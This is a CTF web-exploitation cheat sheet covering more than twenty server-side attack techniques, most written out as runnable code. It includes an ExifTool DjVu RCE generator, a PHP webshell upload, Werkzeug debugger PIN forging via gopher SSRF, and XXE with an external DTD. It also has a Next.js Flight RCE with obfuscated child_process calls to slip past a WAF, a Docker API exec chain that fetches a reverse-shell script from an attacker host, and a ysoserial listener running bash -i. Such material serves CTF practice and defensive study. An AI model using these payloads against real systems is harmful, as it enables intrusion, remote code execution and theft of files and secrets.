# CTF Web - Advanced Server-Side Techniques

## Table of Contents
- [ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)](#exiftool-cve-2021-22204--djvu-perl-injection-0xfun-2026)
- [Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)](#go-runebyte-length-mismatch--command-injection-vuwctf-2025)
- [Zip Symlink Path Traversal (UTCTF 2024)](#zip-symlink-path-traversal-utctf-2024)
- [Path Traversal Bypass Techniques](#path-traversal-bypass-techniques)
  - [Brace Stripping](#brace-stripping)
  - [Double URL Encoding](#double-url-encoding)
  - [Python os.path.join](#python-ospathjoin)
- [Flask/Werkzeug Debug Mode Exploitation](#flaskwerkzeug-debug-mode-exploitation)
- [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
- [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)
- [WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)](#weasyprint-ssrf--file-read-cve-2024-28184-nullcon-2026)
  - [Variant 1: Blind SSRF via Attachment Oracle](#variant-1-blind-ssrf-via-attachment-oracle)
  - [Variant 2: Local File Read via file:// Attachment](#variant-2-local-file-read-via-file-attachment)
- [MongoDB Regex Injection / $where Blind Oracle (Nullcon 2026)](#mongodb-regex-injection--where-blind-oracle-nullcon-2026)
- [Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)](#pongo2--go-template-injection-via-path-traversal-nullcon-2026)
- [ZIP Upload with PHP Webshell (Nullcon 2026)](#zip-upload-with-php-webshell-nullcon-2026)
- [basename() Bypass for Hidden Files (Nullcon 2026)](#basename-bypass-for-hidden-files-nullcon-2026)
- [React Server Components Flight Protocol RCE (Ehax 2026)](#react-server-components-flight-protocol-rce-ehax-2026)
  - [Step 1 — Identify RSC via HTTP headers](#step-1--identify-rsc-via-http-headers)
  - [Step 2 — Exploit Flight deserialization for RCE](#step-2--exploit-flight-deserialization-for-rce)
  - [Step 3 — Exfiltrate data via NEXT_REDIRECT](#step-3--exfiltrate-data-via-next_redirect)
  - [Step 4 — Bypass WAF keyword filters](#step-4--bypass-waf-keyword-filters)
  - [Step 5 — Post-RCE enumeration](#step-5--post-rce-enumeration)
  - [Step 6 — Lateral movement to internal services](#step-6--lateral-movement-to-internal-services)
- [SSRF to Docker API RCE Chain (H7CTF 2025)](#ssrf-to-docker-api-rce-chain-h7ctf-2025)
- [Castor XML Deserialization via xsi:type Polymorphism (Atlas HTB)](#castor-xml-deserialization-via-xsitype-polymorphism-atlas-htb)
- [Apache ErrorDocument Expression File Read (Zero HTB)](#apache-errordocument-expression-file-read-zero-htb)
- [SQLite File Path Traversal to Bypass String Equality (Codegate 2013)](#sqlite-file-path-traversal-to-bypass-string-equality-codegate-2013)
- [HQL Injection via Non-Breaking Space (HackIM 2016)](#hql-injection-via-non-breaking-space-hackim-2016)
- [Base64-Encoded Path Traversal (Sharif CTF 2016)](#base64-encoded-path-traversal-sharif-ctf-2016)

---

## ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)

**Affected:** ExifTool ≤ 12.23

**Vulnerability:** DjVu ANTa annotation chunk parsed with Perl `eval`.

**Craft minimal DjVu exploit:**
```python
import struct

def make_djvu_exploit(command):
    # ANTa chunk with Perl injection
    ant_data = f'(metadata "\\c${{{command}}}")'.encode()

    # INFO chunk (1x1 image)
    info = struct.pack('>HHBBii', 1, 1, 24, 0, 300, 300)

    # Build DJVU FORM
    djvu_body = b'DJVU'
    djvu_body += b'INFO' + struct.pack('>I', len(info)) + info
    if len(info) % 2: djvu_body += b'\x00'
    djvu_body += b'ANTa' + struct.pack('>I', len(ant_data)) + ant_data
    if len(ant_data) % 2: djvu_body += b'\x00'

    # FORM header
    # AT&T = optional 4-byte prefix; FORM = IFF chunk type (separate fields)
    djvu = b'AT&T' + b'FORM' + struct.pack('>I', len(djvu_body)) + djvu_body
    return djvu

exploit = make_djvu_exploit("system('cat /flag.txt')")
with open('exploit.djvu', 'wb') as f:
    f.write(exploit)
```

**Detection:** Check ExifTool version. DjVu format is the classic vector. Upload the crafted DjVu to any endpoint that processes images with ExifTool.

---

## Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)

**Pattern (Go Go Cyber Ranger):** Go validates `len([]rune(input)) > 32` but copies `len([]byte(input))` bytes.

**Key insight:** Multi-byte UTF-8 chars (emoji = 4 bytes) count as 1 rune but 4 bytes → overflow.

**Exploit:** 8 emoji (32 bytes, 8 runes) + `";cmd\n"` = 40 bytes total, passes 32-rune check but overflows into adjacent buffer.

```bash
# If flag check uses: exec.Command("/bin/sh", "-c", fmt.Sprintf("test \"%s\" = \"%s\"", flag, input))
# Inject: ";od f*\n"
payload='🔥🔥🔥🔥🔥🔥🔥🔥";od f*\n'
curl -X POST http://target/check -d "secret=$payload"
```

**Detection:** Go web app with length check on `[]rune` followed by byte-level operations (copy, buffer write). Always check for rune/byte mismatch in Go.

---

## Zip Symlink Path Traversal (UTCTF 2024)

**Pattern (Schrödinger):** Server extracts uploaded ZIP without checking symlinks.

```bash
# Create symlink to target file, zip with -y to preserve
ln -s /path/to/flag.txt file.txt
zip -y exploit.zip file.txt
# Upload → server follows symlink → exposes file content
```

**Detection:** Any upload+extract endpoint. `zip -y` preserves symlinks. Many zip extraction utilities follow symlinks by default.

---

## Path Traversal Bypass Techniques

### Brace Stripping
`{.}{.}/flag.txt` → `../flag.txt` after processing

### Double URL Encoding
`%252E%252E%252F` → `../` after two decode passes

### Python os.path.join
`os.path.join('/app/public', '/etc/passwd')` → `/etc/passwd` (absolute path ignores prefix)

---

## Flask/Werkzeug Debug Mode Exploitation

**Pattern (Meowy, Nullcon 2026):** Flask app with Werkzeug debugger enabled + weak session secret.

**Attack chain:**
1. **Session secret brute-force:** When secret is generated from weak RNG (e.g., `random_word` library, short strings):
   ```bash
   flask-unsign --unsign --cookie "eyJ..." --wordlist wordlist.txt
   # Or brute-force programmatically:
   for word in wordlist:
       try:
           data = decode_flask_cookie(cookie, word)
           print(f"Secret: {word}, Data: {data}")
       except: pass
   ```
2. **Forge admin session:** Once secret is known, forge `is_admin=True`:
   ```bash
   flask-unsign --sign --cookie '{"is_admin": true}' --secret "found_secret"
   ```
3. **SSRF via pycurl:** If `/fetch` endpoint uses pycurl, target `http://127.0.0.1/admin/flag`
4. **Header bypass:** Some endpoints check `X-Fetcher` or similar custom headers — include in SSRF request

**Werkzeug debugger RCE:** If `/console` is accessible:
1. **Read system identifiers via SSRF:** `/etc/machine-id`, `/sys/class/net/eth0/address`
2. **Get console SECRET:** Fetch `/console` page, extract `SECRET = "..."` from HTML
3. **Compute PIN cookie:**
   ```python
   import hashlib
   h = hashlib.sha1()
   for bit in (username, "flask.app", "Flask", modfile, str(node), machine_id):
       h.update(bit.encode() if isinstance(bit, str) else bit)
   h.update(b"cookiesalt")
   cookie_name = "__wzd" + h.hexdigest()[:20]
   h.update(b"pinsalt")
   num = f"{int(h.hexdigest(), 16):09d}"[:9]
   pin = "-".join([num[:3], num[3:6], num[6:]])
   pin_hash = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
   ```
4. **Execute via gopher SSRF:** If direct access is blocked, use gopher to send HTTP request with PIN cookie:
   ```python
   cookie = f"{cookie_name}={int(time.time())}|{pin_hash}"
   req = f"GET /console?__debugger__=yes&cmd={cmd}&frm=0&s={secret} HTTP/1.1\r\nHost: 127.0.0.1:5000\r\nCookie: {cookie}\r\n\r\n"
   gopher_url = "gopher://127.0.0.1:5000/_" + urllib.parse.quote(req)
   # SSRF to gopher_url
   ```

**Key insight:** Even when Werkzeug console is only reachable from localhost, the combination of SSRF + gopher protocol allows full PIN bypass and RCE. The PIN trust cookie authenticates the session without needing the actual PIN entry.

---

## XXE with External DTD Filter Bypass

**Pattern (PDFile, PascalCTF 2026):** Upload endpoint filters keywords ("file", "flag", "etc") in uploaded XML, but external DTD fetched via HTTP is NOT filtered.

**Technique:** Host malicious DTD on webhook.site or attacker server:
```xml
<!-- Remote DTD (hosted on webhook.site) -->
<!ENTITY % data SYSTEM "file:///app/flag.txt">
<!ENTITY leak "%data;">
```

```xml
<!-- Uploaded XML (clean, passes filter) -->
<?xml version="1.0"?>
<!DOCTYPE book SYSTEM "http://webhook.site/TOKEN">
<book><title>&leak;</title></book>
```

**Key insight:** XML parser fetches and processes external DTD without applying the upload keyword filter. Response includes flag in parsed field.

**Setup with webhook.site API:**
```python
import requests
TOKEN = requests.post("https://webhook.site/token").json()["uuid"]
dtd = '<!ENTITY % d SYSTEM "file:///app/flag.txt"><!ENTITY leak "%d;">'
requests.put(f"https://webhook.site/token/{TOKEN}/request/...",
             json={"default_content": dtd, "default_content_type": "text/xml"})
```

---

## Path Traversal: URL-Encoded Slash Bypass

**`%2f` bypass:** Nginx route matching doesn't decode `%2f` but filesystem does:
```bash
curl 'https://target/public%2f../nginx.conf'
# Nginx sees "/public%2f../nginx.conf" → matches /public/ route
# Filesystem resolves to /public/../nginx.conf → /nginx.conf
```
**Also try:** `%2e` for dots, double encoding `%252f`, backslash `\` on Windows.

---

## WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)

**Pattern (Web 2 Doc 1/2):** App converts user-supplied URL to PDF using WeasyPrint. Attachment fetches bypass internal header checks and can read local files.

### Variant 1: Blind SSRF via Attachment Oracle
WeasyPrint `<a rel="attachment" href="...">` fetches the URL in a separate codepath without `X-Fetcher` or similar internal headers. If the target is localhost-only, the attachment fetch succeeds from localhost.

**Boolean oracle:** Embedded file appears in PDF only when target returns HTTP 200:
```python
# Check for embedded attachment in PDF
def has_attachment(pdf_bytes):
    return b"/Type /EmbeddedFile" in pdf_bytes

# Blind extraction via charCodeAt oracle
for i in range(flag_len):
    for ch in charset:
        html = f'<a rel="attachment" href="http://127.0.0.1:5000/admin/flag?i={i}&c={ch}">A</a>'
        pdf = convert_url_to_pdf(host_html(html))
        if has_attachment(pdf):
            flag += ch; break
```

### Variant 2: Local File Read via file:// Attachment
```html
<!-- Host this HTML, submit URL to converter -->
<link rel="attachment" href="file:///flag.txt">
```
**Extract:** `pdfdetach -save 1 -o flag.txt output.pdf`

**Key insight:** WeasyPrint processes `<link rel="attachment">` and `<a rel="attachment">` -- both can reference `file://` or internal URLs. The attachment is embedded in the PDF as a file stream.

---

## MongoDB Regex Injection / $where Blind Oracle (Nullcon 2026)

**Pattern (CVE DB):** Search input interpolated into `/.../i` regex in MongoDB query. Break out of regex to inject arbitrary JS conditions.

**Injection payload:**
```text
a^/)||(<JS_CONDITION>)&&(/a^
```
This breaks the regex context and injects a boolean condition. Result count reveals truth value.

**Binary search extraction:**
```python
def oracle(condition):
    # Inject into regex context
    payload = f"a^/)||(({condition}))&&(/a^"
    html = post_search(payload)
    return parse_result_count(html) > 0

# Find flag length
lo, hi = 1, 256
while lo < hi:
    mid = (lo + hi + 1) // 2
    if oracle(f"this.product.length>{mid}"): lo = mid
    else: hi = mid - 1
length = lo + 1

# Extract each character
for i in range(length):
    l, h = 31, 126
    while l < h:
        m = (l + h + 1) // 2
        if oracle(f"this.product.charCodeAt({i})>{m}"): l = m
        else: h = m - 1
    flag += chr(l + 1)
```

**Detection:** Unsanitized input in MongoDB `$regex` or `$where`. Test with `a/)||true&&(/a` vs `a/)||false&&(/a` -- different result counts confirm injection.

---

## Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)

**Pattern (WordPress Static Site Generator):** Go app renders templates with Pongo2. Template parameter has path traversal allowing rendering of uploaded files.

**Attack chain:**
1. Upload file containing: `{% include "/flag.txt" %}`
2. Get upload ID from session cookie (base64 decode, extract hex ID)
3. Request render with traversal: `/generate?template=../uploads/<id>/pwn`

**Pongo2 SSTI payloads:**
```text
{% include "/etc/passwd" %}
{% include "/flag.txt" %}
{{ "test" | upper }}
```

**Detection:** Go web app with template rendering + file upload. Check for `pongo2`, `jet`, or standard `html/template` in source.

---

## ZIP Upload with PHP Webshell (Nullcon 2026)

**Pattern (virus_analyzer):** App accepts ZIP uploads, extracts to web-accessible directory, serves extracted files.

**Exploit:**
```bash
# Create PHP webshell
echo '<?php echo file_get_contents("/flag.txt"); ?>' > shell.php
zip payload.zip shell.php
curl -F 'zipfile=@payload.zip' http://target/
# Access: http://target/uploads/<id>/shell.php
```

**Variants:**
- If `system()` blocked ("Cannot fork"), use `file_get_contents()` or `readfile()`
- If `.php` blocked, try `.phtml`, `.php5`, `.phar`, or upload `.htaccess` first
- Race condition: file may be deleted after extraction -- access immediately

---

## basename() Bypass for Hidden Files (Nullcon 2026)

**Pattern (Flowt Theory 2):** App uses `basename()` to prevent path traversal in file viewer, but it only strips directory components. Hidden/dot files in the same directory are still accessible.

**Exploit:**
```bash
# basename() allows .lock, .htaccess, etc.
curl "http://target/?view_receipt=.lock"
# .lock reveals secret filename
curl "http://target/?view_receipt=secret_XXXXXXXX"
```

**Key insight:** `basename()` is NOT a security function -- it only extracts the filename component. It doesn't filter hidden files (`.foo`), backup files (`file~`), or any filename without directory separators.

---

## React Server Components Flight Protocol RCE (Ehax 2026)

**Pattern (Flight Risk):** Next.js app using React Server Components (RSC). The Flight protocol deserializes client-sent objects on the server. A crafted fake Flight chunk exploits the constructor chain (`constructor → constructor → Function`) for arbitrary code execution (CVE-2025-55182).

### Step 1 — Identify RSC via HTTP headers

Intercept form submissions in the Network tab. RSC-specific headers:
```http
POST / HTTP/1.1
Next-Action: 7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd
Accept: text/x-component
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D
Content-Type: multipart/form-data; boundary=----x
```

Confirm the server function name in client JS bundles:
```javascript
createServerReference("7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd", callServer, void 0, findSourceMapURL, "greetUser")
```

### Step 2 — Exploit Flight deserialization for RCE

Craft a fake Flight chunk in the multipart form body. The `_prefix` field contains the payload. The constructor chain (`constructor → constructor → Function`) enables arbitrary JavaScript execution on the server.

Request structure:
```http
POST / HTTP/1.1
Host: target
Next-Action: <action_hash>
Accept: text/x-component
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="0"

THE FAKE FLIGHT CHUNK HERE
------x
Content-Disposition: form-data; name="1"

"$@0"
------x--
```

### Step 3 — Exfiltrate data via NEXT_REDIRECT

Next.js uses `NEXT_REDIRECT` errors internally for navigation. Abuse this to exfiltrate data through the `x-action-redirect` response header:

```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/login?a=${encodeURIComponent(RESULT)};307;`
});
```

The server responds with:
```http
HTTP/1.1 303 See Other
x-action-redirect: /login?a=<exfiltrated_data>;push
```

Example — confirm RCE with `process.pid`:
```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/login?a=${process.pid};307;`
});
// Response: x-action-redirect: /login?a=1;push
```

### Step 4 — Bypass WAF keyword filters

When keywords like `child_process`, `execSync`, `mainModule` are blocked (403 response with "WAF Alert"):

1. **String concatenation:**
   ```javascript
   p['main'+'Module']['requ'+'ire']('chi'+'ld_pro'+'cess')
   ```

2. **Hex encoding:**
   ```javascript
   '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'  // child_process
   '\x65\x78\x65\x63\x53\x79\x6e\x63'                        // execSync
   ```

3. **Combined in payload:**
   ```javascript
   var p=process;
   var m=p['main'+'Module'];
   var r=m['requ'+'ire'];
   var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
   var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63']('id').toString();
   throw Object.assign(new Error('NEXT_REDIRECT'),
     {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
   ```

### Step 5 — Post-RCE enumeration

```javascript
// Working directory
process.cwd()                        // → /app

// Process arguments
process.argv                         // → /usr/local/bin/node,/app/server.js

// List files
process.mainModule.require('fs').readdirSync(process.cwd()).join(',')

// Read files
process.mainModule.require('fs').readFileSync('vault.hint').toString('hex')

// Check available modules
Object.keys(process.mainModule.require('http'))
```

### Step 6 — Lateral movement to internal services

After discovering internal services (e.g., from hint files):
```javascript
// Use nc to reach internal HTTP services
var p=process;var m=p['main'+'Module'];var r=m['requ'+'ire'];
var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63'](
  'printf "GET /flag.txt HTTP/1.1\\r\\nHost: internal-vault\\r\\n\\r\\n" | nc internal-vault 9009'
).toString();
throw Object.assign(new Error('NEXT_REDIRECT'),
  {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
```

**Key insight:** The NEXT_REDIRECT mechanism provides a reliable out-of-band data exfiltration channel through the `x-action-redirect` response header. Combined with WAF bypass via string concatenation and hex encoding, this enables full RCE even in filtered environments.

**Full exploit chain:** Identify RSC headers → craft fake Flight chunk → bypass WAF → achieve RCE → enumerate filesystem → discover internal services → lateral movement via `nc` to retrieve flag.

**Detection:** `Accept: text/x-component` + `Next-Action` header in requests, `createServerReference()` in client JS, Next.js Server Actions with user-controlled form data.

---

## SSRF to Docker API RCE Chain (H7CTF 2025)

**Pattern (Moby Dock):** Web app with SSRF vulnerability exposes unauthenticated Docker daemon API on port 2375. Chain SSRF through an internal proxy endpoint to relay POST requests and achieve RCE.

**Step 1 — Discover internal services via SSRF:**
```bash
# Enumerate localhost ports through SSRF
curl "http://target/validate?url=http://localhost:2375/version"
curl "http://target/validate?url=http://localhost:8090/docs"
```

**Step 2 — Extract files from running containers via Docker archive endpoint:**
```bash
# List containers
curl "http://target/validate?url=http://localhost:2375/containers/json"

# Read files from container filesystem (returns tar archive)
curl "http://target/validate?url=http://localhost:2375/v1.51/containers/<container_id>/archive?path=/flag.txt"
```

**Step 3 — Execute commands via Docker exec API (requires POST relay):**

When SSRF only allows GET requests, find an internal endpoint that can relay POST requests (e.g., `/request?method=post&data=...&url=...`).

```bash
# 1. Create exec instance
curl "http://target/validate?url=http://localhost:8090/request?method=post\
&data={\"AttachStdout\":true,\"Cmd\":[\"cat\",\"/flag.txt\"]}\
&url=http://localhost:2375/v1.51/containers/<id>/exec"
# Returns: {"Id": "<exec_id>"}

# 2. Start exec instance
curl "http://target/validate?url=http://localhost:8090/request?method=post\
&data={\"Detach\":false,\"Tty\":false}\
&url=http://localhost:2375/v1.51/exec/<exec_id>/start"
```

**For reverse shell access:**
```bash
# 1. Download shell script into container
# Cmd: ["wget", "http://attacker/shell.sh", "-O", "/tmp/shell.sh"]

# 2. Execute with sh (not bash — busybox containers lack bash)
# Cmd: ["sh", "/tmp/shell.sh"]
```

**Key Docker API endpoints for exploitation:**
| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/version` | GET | Confirm Docker API access |
| `/containers/json` | GET | List running containers |
| `/containers/<id>/archive?path=<path>` | GET | Extract files (tar format) |
| `/containers/<id>/exec` | POST | Create exec instance |
| `/exec/<id>/start` | POST | Run exec instance |
| `/images/json` | GET | List available images |
| `/containers/create` | POST | Create new container |

**Key insight:** Unauthenticated Docker daemons on port 2375 give full container control. When SSRF is GET-only, look for internal proxy or request-relay endpoints that forward POST requests. Use `sh` instead of `bash` in minimal containers (busybox, alpine).

---

## Castor XML Deserialization via xsi:type Polymorphism (Atlas HTB)

**Pattern:** Castor XML `Unmarshaller` without mapping file trusts `xsi:type` attributes, allowing arbitrary Java class instantiation.

**Attack chain:** `xsi:type` → `PropertyPathFactoryBean` + `SimpleJndiBeanFactory` → JNDI/RMI → ysoserial JRMP listener → `CommonsBeanutils1` gadget → RCE

**Requires:** Java 11 (not 17+) — ysoserial gadgets fail on Java 17+ due to module access restrictions.

**XML payload example with Spring beans for RMI callback:**
```xml
<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:java="http://java.sun.com">
  <item xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean">
    <targetBeanName>
      <item xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory">
        <shareableResources>rmi://ATTACKER:1099/exploit</shareableResources>
      </item>
    </targetBeanName>
    <propertyPath>foo</propertyPath>
  </item>
</data>
```

```bash
# Start ysoserial JRMP listener
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}'
```

**Key insight:** Castor XML without explicit mapping files is effectively an XML-based deserialization sink. The `xsi:type` attribute acts like Java's `ObjectInputStream` — any class on the classpath can be instantiated. Check `pom.xml` for `castor-xml`, `commons-beanutils`, and `commons-collections` dependencies. JNDI (Java Naming and Directory Interface) via RMI (Remote Method Invocation) provides the callback mechanism.

**Detection:** Java app using Castor XML for deserialization, `castor-xml` in `pom.xml`, `commons-beanutils`/`commons-collections` dependencies.

---

## Apache ErrorDocument Expression File Read (Zero HTB)

**Pattern:** Apache's `ErrorDocument` directive with expression syntax reads files at the Apache level, bypassing PHP engine disable.

**Requires:** `AllowOverride FileInfo` in userdir config.

**Attack chain:**
1. Upload `.htaccess` to subdirectory via SFTP (Secure File Transfer Protocol):
```apache
ErrorDocument 404 "%{file:/etc/passwd}"
```
2. Request a nonexistent URL in that directory to trigger the 404 handler
3. Read PHP source via `cat -v` to see raw content:
```apache
ErrorDocument 404 "%{file:/var/www/html/stats.php}"
```

**Key insight:** Works even when `php_admin_flag engine off` disables PHP execution in user directories. The `%{file:...}` expression is evaluated by Apache itself, not PHP — so PHP disable flags are irrelevant.

**Detection:** Apache with `mod_userdir`, `AllowOverride FileInfo`, writable `.htaccess` in subdirectories.

---

## SQLite File Path Traversal to Bypass String Equality (Codegate 2013)

**Pattern:** PHP code blocks a specific input value via string equality check, then interpolates the input into a filesystem path. Path normalization bypasses the string check while resolving to the blocked resource.

**Vulnerable code:**
```php
if ($_POST['name'] == "GM") die("you can not view&save with 'GM'");
$db = sqlite_open("/var/game_db/gamesim_" . $_SESSION['scrap'] . ".db");
```

**Exploit:** Set `name` to `/../gamesim_GM` — this fails the `== "GM"` check, but the constructed path `/var/game_db/gamesim_/../gamesim_GM.db` normalizes to `/var/game_db/gamesim_GM.db`.

```bash
curl -X POST -b 'session=...' \
  -d 'name=/../gamesim_GM' \
  'http://target/view.php'
```

**Key insight:** String equality checks on user input are bypassed whenever the input is later used in a filesystem path that undergoes normalization. The `../` sequence is invisible to string comparison but resolved by the OS. Look for this pattern wherever user input is both validated by string comparison and interpolated into file paths, database paths, or URLs.

---

## HQL Injection via Non-Breaking Space (HackIM 2016)

Hibernate Query Language blocks subqueries. Bypass by exploiting character encoding mismatch between HQL parser and underlying database (H2):

- HQL parser treats non-breaking space (U+00A0) as a regular character (concatenates tokens into one word)
- H2 database interprets U+00A0 as whitespace (separates tokens normally)

**Key insight:** Replace spaces in SQL subqueries with U+00A0 to smuggle them past HQL validation.

```python
val = u'\u00a0'  # non-breaking space
# HQL sees: "selectXflagXfromXflagXlimitX1" (one token)
# H2 sees:  "select flag from flag limit 1" (valid SQL)
payload = u"' and (cast(concat('->', (select{0}flag{0}from{0}flag{0}limit{0}1)) as int))=0 or ''='".format(val)
```

Error-based extraction: cast result to int triggers error containing the flag value.

---

## Base64-Encoded Path Traversal (Sharif CTF 2016)

When file inclusion uses base64-encoded filenames as parameters:

```text
file.php?page=aGVscC5wZGY=    (decodes to "help.pdf")
```

Encode traversal payloads in base64:

```python
import base64
# ../index.php
print(base64.b64encode(b"../index.php").decode())  # Li4vaW5kZXgucGhw
# ../../etc/passwd
print(base64.b64encode(b"../../etc/passwd").decode())  # Li4vLi4vZXRjL3Bhc3N3ZA==
```

**Key insight:** Base64 encoding absorbs path traversal characters (`../`) that filters might block in raw form.
